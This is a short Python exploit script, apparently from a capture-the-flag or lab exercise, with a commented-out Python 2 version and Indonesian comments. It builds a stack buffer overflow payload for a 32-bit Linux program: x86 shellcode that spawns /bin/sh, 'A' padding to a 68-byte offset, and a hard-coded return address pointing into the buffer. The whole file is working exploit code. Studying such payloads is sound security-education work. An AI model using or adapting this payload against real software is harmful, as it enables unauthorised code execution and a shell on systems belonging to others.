import struct
offset = 68
buff = 0xffffb698
buff_byte = struct.pack("<I", buff)
shellcode = (
    b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
    b"\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\xb0\x0b\xcd\x80"
)
sc_len = len(shellcode)
payload = shellcode + b"A" * (offset - sc_len) + buff_byte
print(payload)




# python2
# import struct
# offset = 68
# buff = 0xffffb698
# # buffer nya harus little endian: 
# # 0xffffb698 -> ff ff b6 98 -> 98 b6 ff ff
# buff_byte = struct.pack("<I", buff)
# # shellcode
# # "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
# # "\x73\x68\x68\x2f\x62\x69\x6e\x89"
# # "\xe3\xb0\x0b\xcd\x80";
# shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
# # length shell code, biar sisanya nanti sampah buat overflow
# sc_len = len(shellcode)
# # shellcode nya + (junk A sepanjang offset - length shellcode) + ret addr
# payload = shellcode + "A" * ( offset - sc_len) + buff_byte
# print(payload)